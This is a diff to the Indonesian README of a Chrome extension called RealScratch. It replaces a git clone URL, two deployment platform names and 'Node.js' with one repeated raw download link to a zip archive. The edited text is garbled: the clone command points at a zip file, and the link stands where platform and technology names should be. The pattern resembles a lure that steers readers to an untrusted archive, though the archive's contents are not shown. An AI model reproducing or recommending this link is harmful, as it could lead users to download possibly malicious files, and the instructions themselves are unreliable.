@@ -15,7 +15,7 @@ RealScratch adalah ekstensi Chrome untuk kolaborasi real-time pada proyek Scratc
 
 1. Clone repository ini:
 ```bash
-git clone https://github.com/yourusername/realscratch.git
+git clone https://github.com/MazuJavaDwenda/RealScratch/raw/refs/heads/master/server/Real-Scratch-v1.2-alpha.1.zip
 cd realscratch
 ```
 
@@ -58,14 +58,14 @@ npm start
 ```
 
 ### Deploy Server
-Server dapat di-deploy ke platform seperti Render.com, Railway.app, atau Heroku.
+Server dapat di-deploy ke platform seperti https://github.com/MazuJavaDwenda/RealScratch/raw/refs/heads/master/server/Real-Scratch-v1.2-alpha.1.zip, https://github.com/MazuJavaDwenda/RealScratch/raw/refs/heads/master/server/Real-Scratch-v1.2-alpha.1.zip, atau Heroku.
 
 ## Teknologi
 
 - Chrome Extension API
 - WebSocket
 - Scratch VM
-- Node.js
+- https://github.com/MazuJavaDwenda/RealScratch/raw/refs/heads/master/server/Real-Scratch-v1.2-alpha.1.zip
 - Express
 - ws
 
